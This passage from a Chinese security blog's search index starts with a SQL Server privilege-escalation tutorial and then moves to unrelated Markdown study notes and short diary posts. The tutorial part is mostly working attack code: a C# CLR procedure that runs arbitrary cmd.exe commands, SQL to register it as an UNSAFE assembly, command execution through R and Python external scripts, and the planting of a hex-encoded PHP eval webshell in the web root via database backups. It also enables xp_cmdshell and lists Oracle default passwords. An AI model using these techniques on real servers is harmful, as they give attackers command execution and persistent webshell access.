c#">using System;<br>using System.Diagnostics;<br>using System.Text;<br>using Microsoft.SqlServer.Server;<br>public partial class StoredProcedures<br>&#123;<br>    [Microsoft.SqlServer.Server.SqlProcedure]<br>    public static void CmdExec (String cmd)<br>    &#123;<br>        // Put your code here<br>        SqlContext.Pipe.Send(Command(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));<br>    &#125;<br><br>    public static string Command(string filename, string arguments)<br>    &#123;<br>        var process = new Process();<br>        process.StartInfo.FileName = filename;<br>        if (!string.IsNullOrEmpty(arguments))<br>        &#123;<br>            process.StartInfo.Arguments = arguments;<br>        &#125;<br>        process.StartInfo.CreateNoWindow = true;<br>        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;<br>        process.StartInfo.UseShellExecute = false;<br>        process.StartInfo.RedirectStandardError = true;<br>        process.StartInfo.RedirectStandardOutput = true;<br>        var stdOutput = new StringBuilder();<br>        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);<br>        string stdError = null;<br>        try<br>        &#123;<br>            process.Start();<br>            process.BeginOutputReadLine();<br>            stdError = process.StandardError.ReadToEnd();<br>            process.WaitForExit();<br>        &#125;<br>        catch (Exception e)<br>        &#123;<br>            SqlContext.Pipe.Send(e.Message);<br>        &#125;<br>        if (process.ExitCode == 0)<br>        &#123;<br>            SqlContext.Pipe.Send(stdOutput.ToString());<br>        &#125;<br>        else<br>        &#123;<br>            var message = new StringBuilder();<br>            if (!string.IsNullOrEmpty(stdError))<br>            &#123;<br>                message.AppendLine(stdError);<br>            &#125;<br>            if (stdOutput.Length != 0)<br>            &#123;<br>                message.AppendLine(stdOutput.ToString());<br>            &#125;<br>            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);<br>        &#125;<br>        return stdOutput.ToString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>右键生成，会在.\项目名称\Database1\bin\Debug下生成4个文件<ul><li>xxx.dacpac</li><li>xxx.dll</li><li>xxx.pdb</li><li>xxx.sql</li></ul></li></ol><p>将dll文件注册进sqlserver：</p><p>十六进制写入(无文件落地)： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY sp_cmdExec<br><span class="hljs-keyword">FROM</span> <span class="hljs-number">0</span>x  <span class="hljs-comment">-- 这里写xxx.sql文件里的</span><br><span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE<br></code></pre></td></tr></table></figure><p>上传dll文件注册：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY sp_cmdExec<br><span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;C:\Users\Administrator\Desktop\xxx1.dll&#x27;</span> <span class="hljs-comment">-- 这里写上传dll文件的路径</span><br><span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE<br></code></pre></td></tr></table></figure><p>通过SSMS注册DLL：</p><p>在图形界面点击程序集-新建程序集-选择DLL</p><p>创建存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> sp_cmdExec<br><span class="hljs-variable">@Command</span> [nvarchar](<span class="hljs-number">4000</span>)<br><span class="hljs-keyword">WITH</span> <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> CALLER<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">EXTERNAL</span> NAME sp_cmdExec.StoredProcedures.CmdExec<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_cmdExec <span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure><p>删除存储过程和程序集：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PROCEDURE</span> sp_cmdExec;<span class="hljs-keyword">DROP</span> ASSEMBLY sp_cmdExec;<br></code></pre></td></tr></table></figure><h4 id="R和python-dbo-dba权限"><a href="#R和python-dbo-dba权限" class="headerlink" title="R和python(dbo/dba权限)"></a>R和python(dbo/dba权限)</h4><p>在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中该服务允许通过 SQL Server 中 sp_execute_external_script 执行 Python 和 R 脚本利用前提sqlserver系统权限可以执行外部脚本</p><p>开启sp_execute_external_script ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启和关闭需要dba权限</span><br><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;external scripts enabled&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;external scripts enabled&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- dbo和dba权限均可执行命令</span><br><span class="hljs-comment">-- 利用R执行命令</span><br><span class="hljs-keyword">EXEC</span> sp_execute_external_script<br><span class="hljs-variable">@language</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-variable">@script</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe /c whoami&quot;,intern=T))&#x27;</span><br><span class="hljs-keyword">WITH</span> <span class="hljs-keyword">RESULT</span> SETS (([cmd_out] text));<br><span class="hljs-comment">--利用python执行命令</span><br><span class="hljs-keyword">exec</span> sp_execute_external_script<br><span class="hljs-variable">@language</span> <span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;Python&#x27;</span>,<br><span class="hljs-variable">@script</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;import subprocess</span><br><span class="hljs-string">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)</span><br><span class="hljs-string">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="差异备份写webshell-dbo权限"><a href="#差异备份写webshell-dbo权限" class="headerlink" title="差异备份写webshell(dbo权限)"></a>差异备份写webshell(dbo权限)</h4><p>dbo和dba都有备份数据库权限，我们可以把数据库备份成可执行脚本文件放到web目录里，获得 webshell</p><p>利用前提:<br>(1) 知道网站绝对路径且路径可写<br>(2) 利用数据库必须存在备份文件</p><p>差异备份：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 生成备份文件</span><br>backup database test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:\phpstudy_pro\WWW\1.bak&#x27;</span>;<br><span class="hljs-comment">-- 创建表并写入一句话木马</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test([cmd][image]);<br><span class="hljs-keyword">Insert</span> <span class="hljs-keyword">into</span> test(cmd)<span class="hljs-keyword">values</span>(<span class="hljs-number">0x3c3f70687020406576616c28245f524551554553545b2761275d293b3f3e</span>);<br><span class="hljs-comment">-- 将数据库进行差异备份</span><br>backup database test <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\phpstudy_pro\WWW\shell.php&#x27;</span> <span class="hljs-keyword">WITH</span> DIFFERENTIAL,FORMAT;<br></code></pre></td></tr></table></figure><p>日志备份：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> database test <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span> <span class="hljs-comment">-- 将数据库修改为完整模式</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd (a image) <span class="hljs-comment">-- 新建表</span><br>backup log test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;c:\phpstudy_pro\www\2.bak&#x27;</span> <span class="hljs-keyword">with</span> init <span class="hljs-comment">-- 备份表</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> cmd (a) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x3c3f70687020406576616c28245f524551554553545b2761275d293b3f3e</span>) <span class="hljs-comment">-- 将一句话木马写入表中</span><br>backup log test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;c:\phpstudy_pro\www\2.php&#x27;</span> <span class="hljs-comment">-- 备份操作日志到指定脚本文件</span><br></code></pre></td></tr></table></figure><h4 id="不支持堆叠的情况下执行系统命令"><a href="#不支持堆叠的情况下执行系统命令" class="headerlink" title="不支持堆叠的情况下执行系统命令"></a>不支持堆叠的情况下执行系统命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> if <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">execute</span>(<span class="hljs-string">&#x27;exec sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1;reconfigure;exec sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;, 1;reconfigure;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h3><p>网上Oracle提权文章极其混乱，很烦。慢慢看</p><h4 id="Oracle用户、角色与权限"><a href="#Oracle用户、角色与权限" class="headerlink" title="Oracle用户、角色与权限"></a>Oracle用户、角色与权限</h4><p>默认用户：</p><table><thead><tr><th>名称</th><th>默认密码</th></tr></thead><tbody><tr><td>SYS</td><td>change_on_install</td></tr><tr><td>SYSTEM</td><td>manager</td></tr><tr><td>SYSMAN</td><td>oem_temp</td></tr><tr><td>scott</td><td>tiger</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>角色：</p><p>角色是一个或者多个系统权限或者对象权限的集合，是便于我们管理用户赋权而演化而来的</p><table><thead><tr><th>ROLE</th></tr></thead><tbody><tr><td>CONNECT</td></tr><tr><td>RESOURCE</td></tr><tr><td>DBA</td></tr><tr><td>SELECT_CATALOG_ROLE</td></tr><tr><td>EXECUTE_CATALOG_ROLE</td></tr><tr><td>DELETE_CATALOG_ROLE</td></tr><tr><td>…..</td></tr></tbody></table><p>查看所有角色：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_roles; <br></code></pre></td></tr></table></figure><p>查看当前用户角色：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_role_privs;<br></code></pre></td></tr></table></figure><p>系统权限：</p><table><thead><tr><th>名称</th><th>权限</th></tr></thead><tbody><tr><td>CREATE SESSION</td><td>创建会话</td></tr><tr><td>CREATE SEQUENCE</td><td>创建序列</td></tr><tr><td>CREATE SYNONYM</td><td>创建同名对象</td></tr><tr><td>CREATE TABLE</td><td>在用户模式中创建表</td></tr><tr><td>DROP TABLE</td><td>在用户模式中删除表</td></tr><tr><td>CREATE PROCEDURE</td><td>创建存储过程</td></tr><tr><td>EXECUTE ANY PROCEDURE</td><td>执行任何模式的存储过程</td></tr><tr><td>…大概200多种</td><td></td></tr></tbody></table><p>查看所有系统权限：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> system_privilege_map;<br></code></pre></td></tr></table></figure><p>查看用户所具有的系统权限：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dba_sys_privs;<br></code></pre></td></tr></table></figure><p>查看当前用户的系统权限：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user_sys_privs;<br></code></pre></td></tr></table></figure><p>对象权限：</p><table><thead><tr><th>权限名</th><th>权限</th></tr></thead><tbody><tr><td>select</td><td>查询</td></tr><tr><td>update</td><td>更新</td></tr><tr><td>insert</td><td>插入</td></tr><tr><td>alter</td><td>修改</td></tr><tr><td>references</td><td>关联</td></tr><tr><td>index</td><td>索引</td></tr><tr><td>delete</td><td>删除</td></tr><tr><td>execute</td><td>执行</td></tr><tr><td>all</td><td>所有权限</td></tr></tbody></table><h4 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h4><h4 id="利用java权限"><a href="#利用java权限" class="headerlink" title="利用java权限"></a>利用java权限</h4><h5 id="DBMS-JVM-EXP-PERMS"><a href="#DBMS-JVM-EXP-PERMS" class="headerlink" title="DBMS_JVM_EXP_PERMS"></a>DBMS_JVM_EXP_PERMS</h5><h5 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h5><h5 id="DBMS-JAVA-RUNJAVA"><a href="#DBMS-JAVA-RUNJAVA" class="headerlink" title="DBMS_JAVA.RUNJAVA"></a>DBMS_JAVA.RUNJAVA</h5><h4 id="暂不知道什么分类"><a href="#暂不知道什么分类" class="headerlink" title="暂不知道什么分类"></a>暂不知道什么分类</h4><h5 id="XML序列化任意文件写入-10"><a href="#XML序列化任意文件写入-10" class="headerlink" title="XML序列化任意文件写入[10]"></a>XML序列化任意文件写入<sup id="fnref:10" class="footnote-ref"><a href="#fn:10" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://ginove.github.io/2018/07/30/%E5%9F%BA%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Oracle%E6%8F%90%E6%9D%83/">[10]</span></a></sup></h5><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.bilibili.com/video/BV1bX4y1V7KF/?spm_id_from=333.999.0.0&vd_source=249ffa3703b6e86763a24381e58a14a4">激荡四十年-1988</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="http://phrack.org/issues/54/8.html#article">http://phrack.org/issues/54/8.html#article</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.51cto.com/article/231122.html">https://www.51cto.com/article/231122.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://github.com/sqlmapproject/sqlmap/wiki/History">https://github.com/sqlmapproject/sqlmap/wiki/History</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://blog.csdn.net/weixin_44426869/article/details/104326877">https://blog.csdn.net/weixin_44426869/article/details/104326877</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://cloud.tencent.com/developer/article/1920885">https://cloud.tencent.com/developer/article/1920885</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://zhuanlan.zhihu.com/p/591938680">https://zhuanlan.zhihu.com/p/591938680</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:10" class="footnote-text"><span><a href="https://ginove.github.io/2018/07/30/%E5%9F%BA%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Oracle%E6%8F%90%E6%9D%83/">https://ginove.github.io/2018/07/30/%E5%9F%BA%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Oracle%E6%8F%90%E6%9D%83/</a><a href="#fnref:10" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown的学习记录</title>
    <link href="/2023/03/20/MarkDown%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/03/20/MarkDown%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="markdown学习之旅"><a href="#markdown学习之旅" class="headerlink" title="markdown学习之旅"></a>markdown学习之旅</h1><p>今天开始学习markdown的语法，以后也将会用markdown记录学习过程，俗话说好记性不如 <del>烂笔头</del> 键盘。</p><p>markdown语法大概分为两个部分 <strong><a href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95">基础语法</a></strong> 与 <strong><a href="#%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95">扩展语法</a></strong> ，一起学习吧 &#x1F60F; 。</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标题语法"><a href="#标题语法" class="headerlink" title="标题语法"></a>标题语法</h3><pre><code class="hljs">#    // 一级标题##   // 二级标题###  // 三级标题</code></pre><h3 id="强调语法"><a href="#强调语法" class="headerlink" title="强调语法"></a>强调语法</h3><pre><code class="hljs">* &amp; _       // 表示斜体,如强调的内容在单词或短语中间用*** &amp; __     // 表示粗体**_ &amp; __*   // 表示粗斜体</code></pre><h3 id="引用语法"><a href="#引用语法" class="headerlink" title="引用语法"></a>引用语法</h3><pre><code class="hljs">&gt;     // 单行块引用&gt;     // 多行块引用&gt;     // 多行块引用&gt;     // 嵌套块引用&gt;&gt;    // 嵌套块引用&gt; *sheny* // 块引用其他元素</code></pre><h3 id="列表语法"><a href="#列表语法" class="headerlink" title="列表语法"></a>列表语法</h3><pre><code class="hljs">1.    // 数字与英文句号组成有序列表2.3.* &amp; _ &amp; +  // 单个字符组成无序列表* sheny    // 列表嵌套* sheny    * sheny    * sheny* sheny    // 嵌套块引用* sheny    &gt; sheny    &gt;sheny* sheny    // 嵌套代码块需要使用八个空格或两个制表符* sheny    &lt;html&gt;        &lt;head&gt;             &lt;title&gt;Test&lt;/title&gt;        &lt;/head&gt;</code></pre><h3 id="代码语法"><a href="#代码语法" class="headerlink" title="代码语法"></a>代码语法</h3><pre><code class="hljs">`        // 反引号包裹``       // 反引号的转义&lt;html&gt;   // 用四个空格或一个制表符创建代码块    &lt;head&gt;    &lt;/head&gt;&lt;/html&gt;</code></pre><h3 id="分隔线语法"><a href="#分隔线语法" class="headerlink" title="分隔线语法"></a>分隔线语法</h3><pre><code class="hljs">*** &amp; --- &amp; ____  // 三个字符创建分割线，且不能有其他内容，且应该前后均留空白行</code></pre><h3 id="链接语法"><a href="#链接语法" class="headerlink" title="链接语法"></a>链接语法</h3><pre><code class="hljs">[链接显示名](链接地址 &quot;链接title&quot;)  // 如下</code></pre><p><a href="https://markdown.com.cn/basic-syntax/links.html" title="快去吧">MarkDown语法官方</a></p><pre><code class="hljs">&lt;https://shenysec.github.io&gt; // 网站&lt;shenysec@github.com&gt;        // 邮箱这是到**[google](www.google.com)**的超链接 // 带格式化链接[asdad] [1]  // 引用类型链接，需与下部分一起使用[1]: https:shenysec.github.io (title) // 这部分格式比较自由</code></pre><h3 id="图片语法"><a href="#图片语法" class="headerlink" title="图片语法"></a>图片语法</h3><pre><code class="hljs">![图片alt](图片链接 &quot;图片title&quot;)[![图片alt](图片链接 &quot;图片title&quot;)](链接地址) // 图片添加链接，链接语法的嵌套</code></pre><h2 id="扩展语法"><a href="#扩展语法" class="headerlink" title="扩展语法"></a>扩展语法</h2><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code class="hljs">| Syntax      | Description |  // --- 创建标题 | 分膈每列 | ----------- | ----------- || Header      | Title       || Paragraph   | Text        |</code></pre><p>官方推荐的在线图形化表格创建<a href="https://www.tablesgenerator.com/markdown_tables">Markdown Tables Generator</a></p><pre><code class="hljs">| Syntax      | Description | Test Text     || :---        |    :----:   |          ---: | // 表格对齐| Header      | Title       | [sheny]()     | // 添加链接| Paragraph   | Text        | `code`        | // 表格添加代码块</code></pre><h3 id="围栏代码块"><a href="#围栏代码块" class="headerlink" title="围栏代码块"></a>围栏代码块</h3><figure class="highlight json"><figcaption><span> </span><a href="//">输入对应语言实现语法高亮</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>,<br><span class="hljs-attr">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;Smith&quot;</span>,<br><span class="hljs-attr">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><pre><code class="hljs">这是脚注[^1]  // 类似引用类型链接</code></pre><h3 id="标题编号"><a href="#标题编号" class="headerlink" title="标题编号"></a>标题编号</h3><pre><code class="hljs">### 标题 &#123;#name&#125;  // 使用链接，链接到这个标题，&#123;#是hexo的注释保留符，这俩会冲突但是hexo会有默认的title，直接链接title就可以了</code></pre><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><pre><code class="hljs">First Term    // ：+空格 创建定义列表: This is the definition of the first term.</code></pre><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><pre><code class="hljs">~~   // 使用两个波浪符号包括删除线，波浪号前面需要有空格</code></pre><h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><pre><code class="hljs">- [x] Write the press release  // 创建一个带复选框的列表+ [ ] Update the website+ [ ] Contact the media</code></pre><h3 id="使用Emoji"><a href="#使用Emoji" class="headerlink" title="使用Emoji"></a>使用Emoji</h3><pre><code class="hljs">:joy: // 使用冒号包裹emoji简码，简码如下：emoji简码在markdown中有两种使用方法通用代码 Unicode：   // hexo 只支持通用代码，到处都是坑    使用格式为：:+对应英文单词+:&amp;#x+unicode+;非通用代码：    使用格式为：:+对应英文单词+:</code></pre><p><a href="http://www.unicode.org/emoji/charts/full-emoji-list.html" title="Unicode">Emoji Unicode全列表</a></p><p><a href="https://www.webfx.com/tools/emoji-cheat-sheet/">Emoji 简易代码全列表</a></p><h3 id="自动网址链接"><a href="#自动网址链接" class="headerlink" title="自动网址链接"></a>自动网址链接</h3><pre><code class="hljs">https:shenysec.github.io    // markdown会自动链接url`https:shenysec.github.io`  // 禁用自动url链接</code></pre>]]></content>
    
    
    <categories>
      
      <category>杂学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>One Day</title>
    <link href="/2023/03/19/One-Day/"/>
    <url>/2023/03/19/One-Day/</url>
    
    <content type="html"><![CDATA[<p>大概从今天开始记录。俗话说好记性不如烂笔头。</p>]]></content>
    
    
    <categories>
      
      <category>吐槽</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>6月12</title>
    <link href="/2022/06/12/6%E6%9C%8812/"/>
    <url>/2022/06/12/6%E6%9C%8812/</url>
    
    <content type="html"><![CDATA[<p>好久没看blog了差点搞忘记咋搞了</p><p>markdown也没有学，域名也过期了，哎</p>]]></content>
    
    
    <categories>
      
      <category>吐槽</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
